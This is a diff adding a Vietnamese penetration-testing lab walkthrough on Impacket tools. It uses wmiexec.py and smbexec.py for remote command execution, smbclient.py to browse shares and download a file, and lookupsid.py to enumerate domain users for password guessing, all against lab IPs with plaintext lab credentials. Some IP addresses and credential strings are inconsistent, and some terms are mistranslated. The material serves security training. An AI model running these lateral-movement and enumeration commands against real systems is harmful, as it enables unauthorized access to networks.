@@ -5089,3 +5089,307 @@ wmic /node:Sec560Student process where name="nc.exe" delete
 
 Tóm lại, trong bài thực hành này, bạn đã thấy cách khiến các máy tính Windows mục tiêu chạy các lệnh do bạn lựa chọn. Hai kỹ thuật được đề cập, sử dụng scđể tạo và chạy một dịch vụ (qua đó mô phỏng psexecnhưng chỉ sử dụng các công cụ tích hợp sẵn) và chạy wmicđể khiến mục tiêu khởi động một tiến trình, đặc biệt hữu ích cho các chuyên gia kiểm thử xâm nhập vì chúng ứng dụng các tính năng tích hợp sẵn của Windows. Cuối bài thực hành này, hãy đảm bảo bạn tắt các trình lắng nghe Netcat, cũng như xóa các tệp ncservicevà ncservice2mà bạn đã tạo trong suốt bài thực hành.
 
+# Lab 4.2. Impacket
+
+## Mục tiêu
+
+- Để làm quen với các mô-đun Impacket: wmiexec.py, smbexec.py, smbclient.py và lookupsid.py.
+
+- Sử dụng Impacket với nhiều phương thức xác thực khác nhau.
+
+- Sử dụng Impacket để tương tác hiệu quả với hệ thống từ xa.
+
+## Thiết lập phòng thí nghiệm
+
+Các máy ảo được sử dụng:
+
+- Slingshot Linux.
+
+- Windows 10.
+
+Bạn có thể ping địa chỉ 10.130.10.10 từ máy ảo Slingshot Linux:
+
+```bash
+ping -c 4 10.130.10.25
+```
+
+![alt text](IMG/LAB4/LAB4.3/image.png)
+
+## Hướng dẫn thực hành từng bước
+
+Impacket là một bộ công cụ rất mạnh mẽ cho phép chúng ta tương tác với nhiều dịch vụ của Windows. Điều tuyệt vời là, toàn bộ mã nguồn đều có sẵn, vì vậy chúng ta có thể sử dụng các công cụ này và phát triển chúng để tạo ra các công cụ khác!
+
+Chúng ta sẽ cùng xem xét một vài tính năng của Impacket.
+
+### 1. wmiexec.py
+
+Công cụ này cho phép chúng ta chạy các lệnh trên một dịch vụ từ xa. Tuy nhiên, nó yêu cầu chúng ta phải có quyền truy cập cấp quản trị trên máy mục tiêu. Nhược điểm lớn nhất là nó sử dụng DCOM và chúng ta cần có khả năng truy cập các cổng DCOM trên hệ thống mục tiêu, nhưng đôi khi chúng bị chặn bởi tường lửa, và bạn có thể phải sử dụng một công cụ khác, chẳng hạn như smbclient.py (sẽ được thảo luận sau).
+
+Cú pháp của lệnh là:
+
+```bash
+wmiexec.py [[domain/]username[:password]@]<targetName or address> command
+```
+Ít nhất, chúng ta cần cung cấp tên người dùng, mục tiêu và lệnh.
+
+```bash
+wmiexec.py username@target command
+```
+
+Hãy nhắm mục tiêu vào các máy chủ Windows của bạn.
+
+```bash
+wmiexec.py sec560@10.130.10.25 hostname
+# > Nhập mật khẩu sec560khi được yêu cầu.
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-1.png)
+
+Chúng ta có thể sử dụng các giao thức tích hợp sẵn của Windows để chạy các lệnh trên một hệ thống từ xa. Thậm chí tốt hơn nữa, chúng ta không cần cài đặt phần mềm quản trị (agent) trên hệ thống đó!
+
+Hãy xem chúng ta đang xác thực với tư cách ai bằng cách sử dụng `whoami`. Nhấn phím mũi tên lên, sau đó thay thế `hostname` bằng `whoami`.
+
+```bash
+wmiexec.py sec560@10.130.10.25 whoami
+# > Nhập mật khẩu sec560khi được yêu cầu.
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-2.png)
+
+Lệnh này trả về tên máy tính (`sec560student`) theo sau là tên người dùng (`sec560`).
+
+Đến giờ, có lẽ bạn đã cảm thấy khó chịu vì phải nhập mật khẩu mỗi lần. Hãy đơn giản hóa việc này bằng cách đặt `:password` (nơi chứa mật khẩu sec560) ngay sau tên người dùng.
+
+```bash
+wmiexec.py sec560:1234@abcd@10.130.10.25 whoami
+```
+
+Với cách chúng ta đang thực hiện, mỗi lệnh đều độc lập với các lệnh khác. Hãy cùng tìm hiểu điều này.
+
+Trước tiên, hãy xem vị trí thư mục hiện tại của chúng ta bằng cách chạy lệnh `cd`.
+
+```bash
+wmiexec.py sec560:1234@abcd@10.130.10.25 cd
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-3.png)
+
+Trong `cmd.exe` của Windows, `cd` lệnh (không có đối số) hiển thị thư mục hiện tại của chúng ta (tương tự như pwdtrên Linux).
+
+Tiếp theo, chúng ta hãy chuyển thư mục đến `Users`.
+
+```bash
+wmiexec.py sec560:1234@abcd@10.130.10.25 cd users
+```
+
+Hãy lưu ý rằng công cụ không nhớ bạn đã chuyển đến `Users` thư mục nào. Chúng ta có thể khắc phục điều này bằng cách sử dụng đường dẫn đầy đủ đến các tệp, nhưng điều này có thể yêu cầu gõ thêm rất nhiều. Hãy chạy công cụ ở chế độ tương tác, nơi nó SẼ ghi nhớ vị trí của bạn!
+
+Chạy lại công cụ, nhưng không thêm lệnh nào ở cuối. Điều này sẽ bắt đầu một phiên tương tác.
+
+```bash
+wmiexec.py sec560:1234@abcd@10.130.10.25
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-4.png)
+
+Giờ chúng ta đã có một giao diện nhắc lệnh tương tác! Hãy thử một vài lệnh để xem điều gì xảy ra.
+
+```bash
+cd users
+whoami
+cd
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-5.png)
+
+Hãy lưu ý rằng công cụ giờ đây đã ghi nhớ vị trí, ngay cả sau khi chạy một lệnh khác ở giữa chừng!
+
+Hãy thoát khỏi lớp shell này.
+
+```bash
+exit
+```
+
+Chúng ta hãy cùng xem xét một công cụ khác, smbexec.py.
+
+### 2. smbexec.py
+
+Công cụ này hoạt động tương tự như wmiexec. Nó có thể hoạt động ở hai chế độ, tùy thuộc vào cách công cụ được chạy. Theo tài liệu:
+
+- Chế độ chia sẻ : bạn chỉ định một thư mục chia sẻ, và mọi thao tác sẽ được thực hiện thông qua thư mục chia sẻ đó.
+- Chế độ máy chủ : Nếu vì bất kỳ lý do nào mà không có thư mục chia sẻ nào khả dụng, tập lệnh này sẽ khởi chạy một máy chủ SMB cục bộ, do đó đầu ra của các lệnh được thực thi sẽ được máy đích gửi lại vào một thư mục chia sẻ cục bộ. Lưu ý rằng bạn cần quyền truy cập root để liên kết với cổng 445 trên máy cục bộ.
+
+Ở chế độ "chia sẻ", công cụ của chúng ta sẽ ghi dữ liệu vào ổ đĩa của hệ thống mục tiêu. Chúng ta thường không muốn ghi trực tiếp vào ổ đĩa vì điều này sẽ để lại các dấu vết không cần thiết. Ở chế độ "máy chủ", toàn bộ quá trình ghi được thực hiện vào một thư mục chia sẻ trên hệ thống của kẻ tấn công và hệ thống từ xa sẽ kết nối với hệ thống tấn công. Máy chủ chạy trên cổng 445 và yêu cầu quyền truy cập root để lắng nghe trên cổng đó. Chúng ta sẽ chạy công cụ ở chế độ máy chủ với quyền root.
+
+Cú pháp của các công cụ Impacket này tương tự nhau. Chúng ta chỉ cần nhấn phím mũi tên lên, nhấn phím CTRL+ ađể nhảy đến đầu dòng và thay thế `wmi` bằng `smb`.
+
+```bash
+sudo smbexec.py sec560:1234@abcd@10.130.10.25
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-6.png)
+
+Công cụ này rất giống với công cụ trước đó. Chúng ta hãy xem lệnh này `whoami`.
+
+```bash
+whoami
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-7.png)
+
+Hãy lưu ý rằng chúng ta đang chạy với quyền `system`. Điều này có thể là cần thiết hoặc không. Nó phụ thuộc vào việc bạn cần quyền quản trị (với hệ thống) hay bạn cần truy cập với tư cách người dùng thông thường hoặc người dùng miền (để truy cập các tài nguyên khác).
+
+```bash
+cd users
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-8.png)
+
+Hãy lưu ý rằng shell này không lưu trạng thái. Chúng ta không thể thay đổi thư mục nên luôn phải sử dụng đường dẫn đầy đủ để điều hướng. Hãy xem nó trông như thế nào.
+
+```bash
+dir \users
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-9.png)
+
+
+Nếu muốn tìm kiếm trong `sec560` thư mục con `Users`, ta phải sử dụng đường dẫn đầy đủ, như thế này:
+
+```bash
+dir \users\sec560
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-10.png)
+
+Nếu muốn tiến thêm một bước nữa, chúng ta cần sử dụng lại toàn bộ đường dẫn. May mắn thay, bạn có thể nhấn phím mũi tên lên để truy cập lệnh trước đó và chỉ cần thêm `\Desktop` vào cuối.
+
+Nhấn phím mũi tên lên và thêm `\Desktop` vào cuối lệnh.
+
+```bash
+dir \users\sec560\Desktop
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-11.png)
+
+Việc lựa chọn giữa smbexec.py và wmiexec.py phụ thuộc vào những gì có sẵn trên hệ thống từ xa và sở thích cá nhân.
+
+Hãy đóng phiên làm việc từ xa bằng cách gõ lệnh `exit`. Sau đó, chúng ta hãy xem xét một công cụ khác: smbclient.py.
+
+### 3. smbclient.py
+
+Điều này khác với `smbexec.py`. Đây là một chương trình khách được sử dụng để điều hướng các thư mục chia sẻ và di chuyển tập tin đến và từ các hệ thống. Hãy kết nối với máy chủ tập tin tại 10.130.10.25. Lần này, chúng ta sẽ sử dụng người dùng miền và mật khẩu mà chúng ta đã tìm ra trước đó trong lớp học. Vì đây là người dùng miền, chúng ta cần định dạng tên người dùng là domain/username. Chúng ta vẫn có thể sử dụng mật khẩu trên dòng lệnh.
+
+Khởi tạo kết nối smbclient.py với máy chủ tập tin bằng cách sử dụng bgreen.
+
+```bash
+smbclient.py hiboxy/bgreen:Password1@10.130.10.25
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-12.png)
+
+Hiện tại chúng ta đã có một công cụ tương tác. Công cụ này hoạt động tương tự như smbclientlệnh trong Linux.
+
+Trước tiên, hãy cùng xem phần trợ giúp bằng cách chạy lệnh này help.
+
+```bash
+help
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-13.png)
+
+Hãy cùng xem xét một vài lựa chọn được sử dụng phổ biến nhất.
+
+- `shares` - liệt kê các cổ phiếu hiện có.
+
+- `use {sharename}` - kết nối đến một thư mục chia sẻ cụ thể.
+
+- `cd {path}` - thay đổi thư mục từ xa hiện tại thành {path}.
+
+- `lcd {path}` - thay đổi thư mục cục bộ hiện tại thành {path}.
+
+- `pwd` - hiển thị thư mục từ xa hiện tại.
+
+- `ls {wildcard}` - liệt kê tất cả các tệp trong thư mục từ xa hiện tại.
+
+- `put {filename}` - tải tệp tin có tên {filename} vào đường dẫn hiện tại.
+
+- `get {filename}` - tải xuống tệp có tên {filename} từ đường dẫn hiện tại.
+
+- `cat {filename}` - đọc tên tệp từ đường dẫn hiện tại.
+
+- `close` - đóng phiên SMB hiện tại.
+
+Hãy cùng xem xét hệ thống. Chạy `shares` lệnh.
+
+```bash
+shares
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-14.png)
+
+Các thư mục chia sẻ có đuôi `$` là các thư mục chia sẻ ẩn. Ngoài ra, `ADMIN$`, `C$`, và `IPC$` là các thư mục chia sẻ mặc định. Chúng thường chỉ có thể truy cập được bởi quản trị viên. Hãy cùng xem thư `Tools` mục chia sẻ bằng `use` lệnh.
+
+```bash
+use Tools
+```
+
+Kiểm tra các tệp trên thư mục chia sẻ này bằng lệnh `ls`.
+
+![alt text](IMG/LAB4/LAB4.3/image-15.png)
+
+Điều hướng đến `Cheat_Sheets` thư mục đó và xem nội dung bên trong thư mục.
+
+```bash
+cd Cheat_Sheets
+ls
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-16.png)
+
+Chúng ta có thể tải xuống các tệp bằng lệnh `get`.
+
+Tải xuống `Target_Inventory.csv`.
+
+```bash
+get Target_Inventory.csv
+```
+
+Chúng ta có thể thoát khỏi tập tin và thấy rằng mình đã tải xuống tập tin.
+
+```bash
+exit
+ls -l Target_Inventory.csv
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-17.png)
+
+Chúng ta hãy cùng xem xét thêm một công cụ nữa, lookupsid.py.
+
+### 4. lookupsid.py
+
+Lệnh lookupsid.py sẽ liệt kê tất cả người dùng trong miền. Chúng ta cần chỉ định một người dùng miền cụ thể vì việc liên kết với người dùng null/ẩn danh hiện nay rất hiếm gặp. Trong trường hợp này, mục tiêu sẽ là bộ điều khiển miền.
+
+```bash
+lookupsid.py hiboxy/bgreen:Password1@10.130.10.25
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-18.png)
+
+Bạn sẽ thấy rất nhiều kết quả ở đây. Danh sách bao gồm mọi người dùng (`SidTypeUser`) và nhóm (`SidTypeGroup`) trong miền.
+
+Đây là một danh sách dài, nếu chúng ta chỉ muốn một danh sách ngắn hơn, chúng ta có thể chỉ định RID để dừng trước đó. Chạy lại lệnh, nhưng thêm `520` vào cuối.
+
+```bash
+lookupsid.py hiboxy/bgreen:Password1@10.130.10.4 520
+```
+
+![alt text](IMG/LAB4/LAB4.3/image-19.png)
+
+Đây là một công cụ tuyệt vời để lấy danh sách người dùng trong tên miền nhằm phục vụ việc đoán mật khẩu!
+
+## Phần kết luận
+
+Như bạn thấy, bộ công cụ Impacket cung cấp rất nhiều khả năng. Chúng tôi chỉ đề cập đến bốn công cụ nhưng còn nhiều công cụ khác nữa! Hãy xem tại đây để biết mô tả về nhiều công cụ khác.
+
+Chúng ta sẽ sử dụng những công cụ này và một vài công cụ khác của Impacket trong suốt khóa học này.
